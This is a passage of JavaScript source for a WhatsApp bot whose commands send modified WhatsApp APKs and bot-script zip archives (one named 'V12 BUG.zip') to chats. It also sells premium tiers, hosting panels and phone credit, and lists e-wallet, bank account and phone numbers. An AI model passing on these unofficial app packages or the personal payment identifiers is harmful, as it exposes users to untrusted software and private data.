"mediaKey": "+zfXSe1Xyi59ehOXTFbT4Vob1z3qfhzrQoJYryFzo+o=",
"fileName": "com.gbwhatsapp.apk",
"fileEncSha256": "HS5o73SZdzpGgFC2wk7zVOIfC/aqEEb6R7KDZxa+ics=",
"directPath": "/v/t62.7119-24/32323647_1704522319943063_7268744727360475273_n.enc?ccb=11-4&oh=01_AdTfiFnWCo_tG9aLOmNkA7RjIBcXLvma8JeW5yEbEN4iqg&oe=63DB9E35",
"mediaKeyTimestamp": "1672750462",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 999999999
Size: 41.50M
Versi Wa   : 2.23.1.11
Packages   : com.gbwhatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break

case 'buypremium':{
const seactiones = [
{
title: `LIST PREMIUM`,
rows: [
{title: `1 MINGGU 25K`, rowId: `${prefix}premkay 1minggu`},
{title: `1 BULAN 75K`, rowId: `${prefix}premkay 1bulan`},
{title: `1 TAHUN 200K`, rowId: `${prefix}premkay 1tahun`},
]
}
]
const listSw = { 
text: `Hai Kak @${sender.split("@")[0]} ${ucapanWaktu}`,
mentions: [sender],
footer: `Mau ${command} ya? Silahkan Pencet Di Bawah Ya Kak`,
buttonText: 'SELECT',
sections: seactiones,
listType: 1}
haikal.sendMessage(from, listSw, { quoted: m })
}
break
case 'premkay':
if ((args[0]) == '1minggu'){
m.reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
haikal.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 25K • Premium 1 Minggu
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1bulan'){
m.reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
haikal.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 75K • Premium 1 Bulan
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
} else
if ((args[0]) == '1tahun'){
m.reply(`Pesanan Kamu Sedang Di Proses Oleh Bot, Silahkan Tunggu Nanti Juga Di Chat Owner Untuk Di Konfirmasi`)
haikal.sendMessage(creator,{text:`*❏ ORDER ❏*
📮 : *Paket:* 200K • Premium 1 Tahun
- @${sender.split("@")[0]}`,mentions: [sender], },{quoted:m})
}
break
case 'hwcap1': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/As0gmHsInIy6e6UPYjrNiigS0hlDosyoIaMy4zMqdjkN.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "com.whatsapp.apk",
"fileSha256": "I0xnpnLeheqy/+ffFvsVRPjaNqtRMyshm1PBKNyZkMM=",
"fileLength": "43515735",
"pageCount": 0,
"mediaKey": "I4hcPhyQAceElP1Bwib4VKEuRSwhmNAsFF3FofLs5yo=",
"fileName": "com.whatsapp.apk",
"fileEncSha256": "Y5g/cazDY49sFl72yHUr5J2sJvOTXrCEEcio+Ms15wM=",
"directPath": "/v/t62.7119-24/25248586_1481423949032257_8662275218785410107_n.enc?ccb=11-4&oh=01_AdTQ15Pq-s4OP2a9fv47ZOedXOx1hqQf1gDzz0Tz8QQKWQ&oe=63DB98CF",
"mediaKeyTimestamp": "1672750462",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 999999999
Size: 41.51M
Versi Wa   : 2.23.1.11
Packages   : com.whatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break


case 'hwcap2': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AmeZ6Zpaqw1FmQgFAFd2tVKPoojkzNm0kmnUEaZQ63ff.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "com.hwmodswa.apk",
"fileSha256": "s52EF7fQYPi61BC8QKm3HjDywbjOC+8saE02ZoYNEHE=",
"fileLength": "43515737",
"pageCount": 0,
"mediaKey": "zCJO443XEt46OwSwcl6mOvVg3awBcQlFgrqUGcSpMvY=",
"fileName": "com.hwmodswa.apk",
"fileEncSha256": "8mgWerVQlnLcKPBCtZAkCqYpMznRoBjb8uoLqVopFFg=",
"directPath": "/v/t62.7119-24/25529407_1424674921695790_2054483089005385603_n.enc?ccb=11-4&oh=01_AdRwDo1ZhGIoOzaW5nVZJTIWJRy7gpKrcZBSLt0owv4obA&oe=63DB9916",
"mediaKeyTimestamp": "1672750462",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 999999999
Size: 41.50M
Versi Wa   : 2.23.1.11
Packages   : com.hwmodswa
Tanda Tangan : V1 + V2 + V3
`)
}
break




case 'hwcap3': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AteXrYtIveEthnvpwdfoG2Wx1fdVQM6PZ3yF4U4OjhK7.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "com.privatehwmods.apk",
"fileSha256": "BqIOKqV9EANJ1DMaqHG5zY285fclOCqYbx82a1HJoSA=",
"fileLength": "43515733",
"pageCount": 0,
"mediaKey": "eE70/Y8gkFydbnUa7MC6QVJGRaNOyjwXb4eJdPNnHCI=",
"fileName": "com.privatehwmods.apk",
"fileEncSha256": "gCArAKb/bhhj/mbW1lRyb5n9HuvzE7DrzSMjA7Z4efk=",
"directPath": "/v/t62.7119-24/56019076_142608418616022_7634680365294243285_n.enc?ccb=11-4&oh=01_AdQLRLfDtsJhvYEKvEusnT5LYOTHEEfCNkxeQeC71LqVDA&oe=63DB9CD4",
"mediaKeyTimestamp": "1672750462",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 999999999
Size: 41.50M
Versi Wa   : 2.23.1.11
Packages   : com.privatehwmods
Tanda Tangan : V1 + V2 + V3
`)
}
break



case 'hwcap4': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AuguiTpeWe4B7f--920G_3BRXrQ5mxYdb_7Mo1G7ErRt.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "com.wago.apk",
"fileSha256": "479poOq9WRN6+OHthWXsRgyDT3easdvW5NjUmrlFMig=",
"fileLength": "43515734",
"pageCount": 0,
"mediaKey": "9NF53WHjcHNHS0gRaWciF/YfDxWw4laREdd6rdp1hiU=",
"fileName": "com.wago.apk",
"fileEncSha256": "LhRhDeOo36rEzR36xK9AM4ABFzfPBQryr6pEDAYbbis=",
"directPath": "/v/t62.7119-24/55680376_1826485511055382_512259021203785243_n.enc?ccb=11-4&oh=01_AdQB-PYzelluYHBSgjbMhuyzFU8g1upO9fxkUrPBrF3j4A&oe=63DB900E",
"mediaKeyTimestamp": "1672750462",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 999999999
Size: 41.50M
Versi Wa   : 2.23.1.11
Packages   : com.wago
Tanda Tangan : V1 + V2 + V3
`)
}
break





case 'hwcap5': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AkUEPTZZVTHsUe7-XtNfGgSXsfUWBgH1obpy8KIZgHyx.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "com.hwwhatsapp.apk",
"fileSha256": "WHKKZOEkYFXr9Qg63O6ynzTaO19bVQFis/vWZ/EcUOw=",
"fileLength": "43515733",
"pageCount": 0,
"mediaKey": "ooOMGfhy/7KG7VF9XRBhnvBg1iX47MuDzFldE//C3k0=",
"fileName": "com.hwwhatsapp.apk",
"fileEncSha256": "vcOpbu1cnI6RhauCyVEhIAKqMBmvqY34+nL//2n9nIA=",
"directPath": "/v/t62.7119-24/30549695_5139404179494774_4648086889572207755_n.enc?ccb=11-4&oh=01_AdRgECyJ5L7pEbRQ6gQImiq3nhZqJ8QLGqpOuOyB_jZPZg&oe=63DBA58E",
"mediaKeyTimestamp": "1672750462",
"caption": "HELLO KAK WHATSAPP INI ASLI BUATAN HW MODS SELAMAT MENCOBA 🥳",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply(`sukses Kirim WhatsApp Base Imune 
Versi Code : 999999999
Size: 41.50M
Versi Wa   : 2.23.1.11
Packages   : com.hwwhatsapp
Tanda Tangan : V1 + V2 + V3
`)
}
break




case 'skripv13': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
	"documentMessage": {
					"url": "https://mmg.whatsapp.net/d/f/Aiw8ar_jCcqiOVBwLrITarOcUk-Bm9UldadhkEeCU6Bt.enc",
					"mimetype": "application/zip",
					"title": "BOT HW MODS V13.zip",
					"fileSha256": "pGu7qfTzc4QSESjCJZjbP9V4qi/llo3gB9k81T9V2c8=",
					"fileLength": "15316333",
					"pageCount": 0,
					"mediaKey": "RQ1vcUKUYJjTlnguUjyuk3zsrHfkDSYcEL9hCvx36Fk=",
					"fileName": "BOT HW MODS V13.zip",
					"fileEncSha256": "ay8/lbvTTAMwBHAxDb2tazhajb8l3mtNAeYsTTB6v1k=",
					"directPath": "/v/t62.7119-24/25480520_1380735262737771_6799097378948460791_n.enc?ccb=11-4&oh=01_AdT-rZGTAIUTMrjm1NnhNpqEPHuwH4bb6vu-MUwQKxKz0g&oe=63EC98EE",
					"mediaKeyTimestamp": "1673861294",
"caption": "HELLO KAK SKRIP INI SUDAH PULIHKAN SEPENUHNYA SELF DAN TIDAK NYA SUDAH SAYA SETTINGS",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply('sukses Kirim Script Bot v13')
}
break


case 'skriptermux': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AiIwjGNnGe5QfI6KUZP31j-2pnxTtu4heGsFPO2RmDqb.enc",
"mimetype": "application/zip",
"title": "NEW FIX V13 TERMUX.zip",
"fileSha256": "p0NFWmipPJ5LKyMj9Fa4aB7gkNb3nMT9n0dzbD3bA+8=",
"fileLength": "15280208",
"pageCount": 0,
"mediaKey": "GeNykCA+KbIu7457pvdk5Qh399Q4WR5Fczh384Jiil4=",
"fileName": "NEW FIX V13.zip",
"fileEncSha256": "3MjtPpI3ASD3zLJcp4u5aQL8LF+mCEgQQOjL+hEOzVo=",
"directPath": "/v/t62.7119-24/35868412_2479747335523446_352549237479009731_n.enc?ccb=11-4&oh=01_AdT-odMYGOvqcyZeoaI4Zycb0b5Cu-VoJASDzajrAyaQtw&oe=63E7A98D&_nc_hot=1673542918",
"mediaKeyTimestamp": "1673542639",
"caption": "HELLO KAK SKRIP INI SUDAH PULIHKAN SEPENUHNYA SELF DAN TIDAK NYA SUDAH SAYA SETTINGS",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply('sukses Kirim Script Bot termux v13')
}
break


case 'skripv12': {
if (!isCreator) return m.reply('Maaf Kamu Belum Terdaftar Dalam User')
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/As4wLODmYfN64iFaXgENTAjOk-8OdX4z3v9gLZFMtS6h.enc",
"mimetype": "application/zip",
"title": "V12 BUG.zip",
"fileSha256": "3QXOmte0CpHzH1Gd81+CFYuhRZGlQWbAisil4jzc0FM=",
"fileLength": "11571160",
"pageCount": 0,
"mediaKey": "lWIak5WYxyiq5wDPVBhSqWWy1KMoz+wGrEEgNjWDnqw=",
"fileName": "V12 BUG.zip",
"fileEncSha256": "fAqYGYobIaInKLujwQMI0BVFKfeSIJrxH6Cf+hrs8zo=",
"directPath": "/v/t62.7119-24/19156251_227544482933395_7915923186625591167_n.enc?ccb=11-4&oh=01_AdQs3qKtsZVQ3mxNoezc5fG2Z07xL8A1F2m4Kg-OeMGDQA&oe=63E6A2F1&_nc_hot=1673479138",
"mediaKeyTimestamp": "1673478686",
"caption": "HELLO KAK SKRIP INI SUDAH PULIHKAN SEPENUHNYA SELF DAN TIDAK NYA SUDAH SAYA SETTINGS",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, document.message, { messageId: document.key.id })
m.reply('sukses Kirim Script bot v12')
}
break
//=================================================//
case 'jualan': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
.whatsapp
.skripv13
.skrip12
.skriptermux
.panel
.diamond
.pulsa
.payment
.nodemodules
.tutorial`)
}
break
//=================================================//
case 'whatsapp': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Untuk Harga Custom WhatsApp 50k Boleh Request Fitur Tampilam Nama Dan Logo Yah Hub: wa.me/6281214281312`)
}
break
//=================================================//
case 'nodemodules': {
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
Download Sendiri Cuy `)
}
break

//=================================================//
case 'panel': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

*Pricelist Harga AmGeekz Panel* :

⚡PAKET G1
1GB RAM/1GB Disk/25% CPU
Rp10.000,00/1 BULAN
⚡PAKET G2
2GB RAM/2GB Disk/50% CPU
Rp15.000,00/1 BULAN
⚡PAKET G3
3GB RAM/3GB Disk/75% CPU
Rp20.000,00/1 BULAN
⚡PAKET G4
4GB RAM/4GB Disk/100% CPU
Rp25.000,00/1 BULAN
⚡PAKET G5
5GB RAM/5GB Disk/125% CPU
Rp30.000,00/1 BULAN
⚡PAKET G6
6GB RAM/6GB Disk/150% CPU
Rp35.000.00/1 BULAN
⚡PAKET G7
7GB RAM/7GB Disk/175% CPU
Rp40.000.00/1 BULAN

---------------------------------------
Pricelist Perpanjang Masa Aktif AmGeekz Panel :

⚡PAKET G1 = Rp5.000
⚡PAKET G2 = Rp7.500
⚡PAKET G3 = Rp10.000
⚡PAKET G4 = Rp12.500
⚡PAKET G5 = Rp15.000
⚡PAKET G6 = Rp17.500
⚡PAKET G7 = Rp20.000

Nb:
Melakukan top up saldo artinya anda setuju dengan segala kebijakan kami.
Untuk pricelist renew berlaku jika ada server yg masih aktif di dalam akun minimal selama 23hari.

*[ Administrator]*
contact.amgeekz.site
Admin1 = 6285649455626
Admin2 = 62895422836123
Admin3 = 6281214281312
`)
}
break
//=================================================//
case 'pulsa': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Pulsa All Operator
Silahkan Ketik Nominal Nya
pulsa > harga
________________
.5.000 > 7k
.10.000 > 12k
.15.000 > 16k
.20.000 > 22k
.25.000 > 25k
.30.000 > 31k
.50.000 > 51k
.100.000 > 99k
.150.000 > 147k
.200.000 > 195k`)
}
break
//=================================================//


case 'pdana': {
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/ArtVc-aoRGq-BDs5ryzdbzeP2NxbXtH9qXS6YD_PUANb.enc",
"mimetype": "image/jpeg",
"fileSha256": "XLq70ROHYmTaiJTtf5rGi6q0FukmSU25OJclXVNnaFg=",
"fileLength": "136476",
"height": 1369,
"width": 984,
"caption": `DANA : 085714170944`,
"mediaKey": "jVs2Qrj6spaghWWvOJztanfBEK9I/yze1CSRzFPKshc=",
"fileEncSha256": "mw7pi0kOX/z6WojQBiy0f1usnbPA9nMIo3v44qIAG7Q=",
"directPath": "/v/t62.7118-24/33525638_1631328093997508_6020395146093552228_n.enc?ccb=11-4&oh=01_AdT2_dU6i1qGoURm1qUz2O1IUps3dinC0qU4ep9JJVJaaw&oe=63E7BCC3",
"mediaKeyTimestamp": "1673547644",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMwMBIgACEQEDEQH/xAAtAAEAAwEBAQAAAAAAAAAAAAAAAQIGAwUEAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAAA0soJch1cuoA8P3PCOU07HPRZfUADP6DwT5a/dB8Wqz2gJBS0rKTakTKVAAVCZAD/xAAmEAEAAQMEAgEEAwAAAAAAAAABAgADEQQQEiEiMRMgM0FxFFFh/9oACAEBAAE/AAIgBgNu673npdPOTKVoXaV+zFRmCVC9aksfmMvoq5KNsit4KhetRVbph9UIgj1vrbL89yZP89xqTKOHiCYqa3M84iHqrsQtw8sFaY42LZ/m+vF1L3xPeajOTGJKYsmpWjlllkPQUtvPGGRHNWvtw/W+u5x1rJQg9FRYj5ZJHquT8j5+C9NAcc9Pl7/NWPsw/W+ssXp6maHWajYvQEYZcVGyuQs4qWmWOIQlGS1ZEtQJew2u25MxzSS49Vxl0tMVKYA0R/v6ORX8iMZYxVu7GZk3EkCOR2Y02wlnP0f/xAAVEQEBAAAAAAAAAAAAAAAAAAAwEf/aAAgBAgEBPwBKH//EABcRAQADAAAAAAAAAAAAAAAAABEAIDD/2gAIAQMBAT8A0I3/AP/Z",
"scansSidecar": "O14M3Hv55JXfBlo5vKZFxaM23MDlB9nErmbENE53dM9+pJ3ti2Lr7Q==",
"scanLengths": [
12031,
84766,
19769,
19910
],
"midQualityFileSha256": "tcYRNyQlsf/9dNTG81Sp5rXC8PtNbzsocm/l7RrOvZs=",
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
break

case 'pgopay': {
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AkERheDpnRAsvGunUhCBebz7YIyGOX5cuSHhPh0B_krT.enc",
"mimetype": "image/jpeg",
"fileSha256": "UIkQtCVaNY4D/Pa2gc3oqri/YupUhOARPKf6JkABs38=",
"fileLength": "112357",
"height": 1098,
"width": 1080,
    "caption": `GOPAY : 085714170944`,
"mediaKey": "aCK72k/1m+ni8wR90AKbUwsuKKOWuFWoV//gkOdHy9E=",
"fileEncSha256": "c/oB48YNSX2mXa7xHJhV3EIdpS4QNBCKSQ75T71KkcY=",
"directPath": "/v/t62.7118-24/31426466_211823664645258_5244269355491505162_n.enc?ccb=11-4&oh=01_AdQPFxaXYm1XoqwW51T4MmLHQf9CcBEpG_GjJsRJbgY-iw&oe=63E7AFA6",
"mediaKeyTimestamp": "1673547825",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEUAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAAAwECBAUGAQACAwEAAAAAAAAAAAAAAAAEBQABAgP/2gAMAwEAAhADEAAAAOri04Clj6LN87i4vLZTMv0hIC45PP6XPMVXfRArJ6y1XSjllq/RgBtsGLXzyV9KXSOdoXTRLdFlkL+6SDMedzt3OKWvYiJLsSu8srN7x3yANvXMGudZC82gJYBJsAx1/8QALRAAAgEDAQYEBgMAAAAAAAAAAQIAAxESIQQFEzEycRBBUVIVIjNCYWIUI4H/2gAIAQEAAT8A256grhFe0LVx95l6/vMNWsDYuZxqvvM41X3mcar7zFr1ch85i6gdpvH68uJlLjzEYgnQeK9Q7xele03l9fwqV+GwXAeg0i1kIUFFyh2mnmBw8R+RKm0YvbAanTSVdSDYC4i9Q7xele03ipNeYsPKPRLVBy1jUqjOMbLKRfJ+IeytMEL2I5yuuLhfQQKbqfzF6V7Tbh/beX+WVON/KVkcIORMNRqlY8zaOyVn0AJErWOOPUp5DzmjMCfaIqjODkO03gSHmRldzmAVJBMZ2FRVVfLVpTWqxcALr5+kWniM2pjRbRiqtoLDESnUBP8AsXpHabeL1Y2ixcXuWSE01W2A1gqKrCyCPXvYYjnKjs75EaxVKte3Mxele03hkK9x6Qm/lEqACxEdsyLTCEWMX1MW2Qi9I7SvsgrNleHd1x1T4X+8G7LHrnw/94d23++fDf2g3eAQcvD/xAAiEQABAwQBBQEAAAAAAAAAAAABAAIREBMyUQMSISIxcWH/2gAIAQIBAT8AYPFqj8CgaUDVOPAIkye6k7KbgPlGYhH2iZQxHynHiFbE4roZqoe4eirj9q4/auP3T//EACYRAAEDAgUDBQAAAAAAAAAAAAEAAgMRUhASEzFxISMyIkJRcpH/2gAIAQMBAT8Amd3H9Tus3w4/qzOuKDnXHCcHVfymsblHpGyyMtCkHcdygpTSRyHVo4TQGigTqZz9jhP5vQmcG+ZRmmHuKFSak7lBGKNxJLVoRWrQitWjFbh//9k=",
"scansSidecar": "3SuDJZs9+s0zy7joaHQUtFsPhpXAyECw7tJ82i6/ddiBcHfSHmM6Tg==",
"scanLengths": [
13724,
77106,
10257,
11270
],
"midQualityFileSha256": "m34qS6btm3Md5Js4pu9415/bMVKhHmPKlQfzpw+GW8k="
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
break

case 'pbca': {
var image = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"imageMessage": {
"url": "https://mmg.whatsapp.net/d/f/AknwfqRu8ivKPIUOLGWoxq7b5zm5jytVyI_-YJmY6kZr.enc",
"mimetype": "image/jpeg",
"fileSha256": "tzdSKEnjTTevVxxrb20t2Ux3VrMiJjvbqKOogFCSdHY=",
"fileLength": "183903",
"height": 1240,
"width": 874,
    "caption": `Rek BCA : 2832657396`,
"mediaKey": "OJQygif+xhRaAtZ8Gdqyj9WakrgcuiIr3kp2WAP9L40=",
"fileEncSha256": "/PLR/yZyBR8SavrUngnnlvsacAb2xOgaszwdKVflZgE=",
"directPath": "/v/t62.7118-24/33310711_200948159138701_2267000136953121123_n.enc?ccb=11-4&oh=01_AdTWXtGlXlrIdiprtE6JJGvrci9aCo2_o6CSGmdcLWv5fQ&oe=63E7CA64",
"mediaKeyTimestamp": "1673547948",
"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMwMBIgACEQEDEQH/xAAtAAACAwEBAAAAAAAAAAAAAAAAAQIDBAUGAQEBAAAAAAAAAAAAAAAAAAAAAf/aAAwDAQACEAMQAAAA9BJsjKmRYpIrJg6bsRA5Ezs7OR1xABg3ZTllgT7HP3jEEUwgnRWltQAFbAmAqygmkBf/xAAmEAACAQQBAgYDAAAAAAAAAAABAgADBBESIBATBSExMkFRFDOR/9oACAEBAAE/AAJiZGcZ64h6uib7fMBGRxr1uym2uYL9GXIWC+X5pyjdCs5UIeF9+tR9mENtqoMZXAVqn8lm6msQOHiC7UhBUCKmBmE74YSyRe+zfPC7RqlPCpsZ+HXz7RDZ1l9ktqNSm+W4bibQsfubCZzwqhija+stVrKG7vAswPksVmJ81x1bODiEVj6GD0GZ/8QAGREBAAIDAAAAAAAAAAAAAAAAEQEQICEw/9oACAECAQE/AOppcYkr/8QAFhEAAwAAAAAAAAAAAAAAAAAAEBFA/9oACAEDAQE/AIkP/9k=",
"scansSidecar": "Tnf3XnWv3AeqXQvCbtX65hZBYw3ssSVt9TVGWVL+7TpXmNOjHh1nKw==",
"scanLengths": [
12532,
110828,
26356,
34187
],
"midQualityFileSha256": "HXQDGJgCdCvxMjKS21BaY+BD6jsCXVBNSg7w04d3/wU="
}
}), { userJid: m.chat })
haikal.relayMessage(m.chat, image.message, { messageId: image.key.id })
}
break
//=================================================//
case 'tutorial': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

Tutorial Run Via Panel
https://youtu.be/rqqxkI4P8YY`)
}
break
//=================================================//
case '5000': case '7k':{
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+5000

gopay : 085714170944
Dana : 085714170944`)
}
break
case '10000': case '12k': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+10000

gopay : 085714170944
Dana : 085714170944`)
}
break
case '15000': case '16k': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+15000

gopay : 085714170944
Dana : 085714170944`)
}
break
case '20000': case '22k': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+20000

gopay : 085714170944
Dana : 085714170944`)
}
break
case '25000': case '25k': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+25000

gopay : 085714170944
Dana : 085714170944`)
}
break
case '30000': case '31k': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+300000

gopay : 085714170944
Dana : 085714170944`)
}
break
case '50000': case '51k': {
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+50000

gopay : 085714170944
Dana : 085714170944`)
}
break
case '100000': case'99k':{
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+100000

gopay : 085714170944
Dana : 085714170944`)
}
break
case '150000': case '147k':{
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+150000

gopay : 085714170944
Dana : 085714170944`)
}
break
case '200000': case '195k':{
if (isBan) return m.reply(`Lah Lu Kan Di Ban`)
m.reply(`◎ © Hay Kak ${pushname} 👋 Selamat ${salam}

[ ] silahkan isi nomor Anda
Hub : Wa.me/6281214281312?text=Beli+Pulsa+Mas+Yang+200000

gopay : 085714170944
Dana : 085714170944`)
}
break
//=================================================//
case 'belajarkita': {
if (!isPrem) return replyprem(mess.premium)
var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/Ah3W96XRKFP1U7LSM1DvTeP81MpC75EBgDUYYQt9B5mF.enc",
"mimetype": "application/vnd.android.package-archive",
"title": "Belajar Bersama_1.11.apk",
"fileSha256": "PdBsdG3dTVg+CAiJJzqlcU/Wc1DHAloGQKV0n5vo30s=",
"fileLength": "7249993",
"pageCount": 0,
